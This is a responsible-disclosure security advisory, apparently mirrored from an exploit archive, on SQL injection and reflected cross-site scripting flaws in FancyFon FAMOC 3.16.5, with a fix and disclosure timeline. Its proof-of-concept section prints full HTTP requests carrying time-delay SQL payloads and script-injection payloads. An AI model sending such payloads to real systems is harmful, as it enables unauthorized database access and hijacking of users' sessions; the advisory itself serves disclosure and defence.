@@ -1,0 +1,196 @@
+id: 23202
+date: 01/28/2015
+title: FancyFon FAMOC 3.16.5 Cross Site Scripting / SQL Injection Vulnerabilities
+author: Matthias Deeg
+cves: 
+
+Product(s): FAMOC
+Vendor: FancyFon
+Affected Version(s): 3.16.5 
+Tested Version(s): 3.16.5
+Vulnerability Type: SQL Injection (CWE-89) / Cross-Site Scripting (CWE-79)
+Risk Level: High
+Solution Status: Fixed
+CVE Reference: Not yet assigned
+Authors of Advisory: Matthias Deeg (SySS GmbH)
+                     Sebastian Nerz (SySS GmbH)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+FAMOC is a mobile device management software by FancyFon supporting
+different kinds of mobile devices.
+
+The vendor FancyFon describes the product as follows (see [1]):
+
+"FAMOC is a flexible and open mobile device lifecycle management 
+solution, enabling any number of smartphones using a variety of 
+operating  systems, to be centrally and remotely managed, over the 
+Internet."
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The SySS GmbH found two boolean-based SQL injection vulnerabilities in 
+the web application component of the FAMOC mobile device management 
+solution which can be exploited from different attacker's perspectives.
+
+1) SQL injection in ajax.php (REST URL parameter for device ID)
+
+The REST URL parameter for the device ID of the PHP script ajax.php is
+not sanitized sufficiently resulting in an SQL injection vulnerability.
+
+This SQL injection vulnerability can be exploited by an
+unauthenticated attacker by sending a specially crafted HTTP POST
+request (see PoC section).
+
+
+2) SQL injection in index.php (URL parameter "order")
+
+The URL parameter "order" of the PHP script index.php is not sanitized
+sufficiently resulting in an SQL injection vulnerability.
+
+This SQL injection vulnerability can be exploited by an authenticated
+attacker that is logged in to the FAMOC web UI by sending a specially
+crafted HTTP GET request (see PoC section).
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+1) SQL injection in ajax.php (REST URL parameter for device ID)
+
+The following HTTP POST request injecting the SQL command
+'+(select * from (select(sleep(10)))a)+' as the URL REST parameter of
+the device ID demonstrates the SQL injection vulnerability by a time 
+delay of 10 seconds for the server response:
+
+POST /ajax.php/'%2b(select%20*%20from%20(select(sleep(10)))a)%2b'/summary.xml?req=mdm/backup_upload.php HTTP/1.1
+Host: <HOST>
+Accept-Encoding: gzip
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 343
+Connection: close
+
+<operation type="backup">
+  <item type="contacts" status="NOTEXIST" num_items="0" size="" path="" message="" passMD5="00000000000000000000000000000000">
+    <file mdm5="" path="/contacts.vcf" status="MISSING" message="DELETED" size="0"/>
+    <file mdm5="" path="/contacts.vcf" status="NOTEXIST" message="FAIL" size="0"/>
+  </item>
+</operation>
+
+
+2) SQL injection in index.php (URL parameter "order")
+
+The following HTTP GET request injecting the SQL command 
+,(select * from (select(sleep(10)))a) via the URL parameter "order"
+demonstrates the SQL injection vulnerability by a time delay of 10 
+seconds for the server response:
+
+GET /index.php?name=&order=my_last_login%20desc%2cinstitution_name%2c(select%20*%20from%20(select(sleep(10)))a)&page=1&myorgs=0 HTTP/1.1
+Host: <HOST>
+Cookie: PHPSESSID=<SESSION_COOKIE>
+
+
+Vulnerability Details:
+
+The SySS GmbH found several reflected cross-site scripting 
+vulnerabilities in the web application component of the FAMOC mobile 
+device management solution which can be exploited from different 
+attacker's perspectives.
+
+1) Reflected Cross-Site Scripting in login form
+
+The parameter "LoginForm[username]" is not sanitized sufficiently
+resulting in a reflected cross-site scripting vulnerability.
+
+This reflected cross-site scripting vulnerability can be exploited in 
+the context of an unauthenticated user by sending a specially crafted
+HTTP POST request (see PoC section).
+
+
+2) Reflected Cross-Site Scripting in index.php
+
+The two URL parameters "order" and "myorgs" of the PHP script index.php
+are not sanitized sufficiently resulting in cross-site scripting
+vulnerabilities.
+
+These reflected cross-site scripting vulnerabilities can be exploited
+in the context of an authenticated user by sending a specially crafted
+HTTP GET request (see PoC section).
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+1) Reflected Cross-Site Scripting in login form
+
+The following HTTP POST request using the JavaScript code
+"><script>alert(1)</script><z=" as the value for the parameter 
+"LoginForm[username]" demonstrates the reflected cross-site scripting
+vulnerability by showing a JavaScript alert box:
+
+POST /ui/system/login HTTP/1.1
+Host: <HOST>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+
+LoginForm%5Busername%5D=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3Cz%3D%22&LoginForm%5Bpassword%5D=password
+
+
+2) Reflected Cross-Site Scripting in index.php
+
+The following HTTP GET requests using the JavaScript code
+'><script>alert(1)</script> as the value for the URL parameter "order" or
+"myorgs" demonstrate the two reflected cross-site scripting vulnerabilities
+by showing a JavaScript alert box.
+
+
+2.1) URL parameter "order"
+
+URL: https://<HOST>/index.php?name=&order=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E&page=1&myorgs=0
+
+GET /index.php?name=&order=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E&page=1&myorgs=0 HTTP/1.1
+Host: <HOST>
+Cookie: PHPSESSID=<SESSION_COOKIE>
+
+
+2.2) URL parameter "myorgs"
+
+URL: https://<HOST>/index.php?name=&order=&page=1&myorgs=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E
+
+GET /index.php?name=&order=&page=1&myorgs=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1
+Host: <HOST>
+Cookie: PHPSESSID=<SESSION_COOKIE>
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Update to FAMOC software version 3.17.4.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2014-12-19: Vulnerability reported to vendor
+2014-12-19: Vendor acknowledges e-mail with SySS security advisory
+2015-01-16: Contacted vendor for status information about the reported
+            vulnerability
+2015-01-23: Vendor responds that this security vulnerability was 
+            addressed in the FAMOC software version 3.17.4.
+            Public release of security advisory
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Product Web Site for FAMOC Mobile Device Management
+    http://www.fancyfon.com/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+#  0day.today [2023-03-23]  #
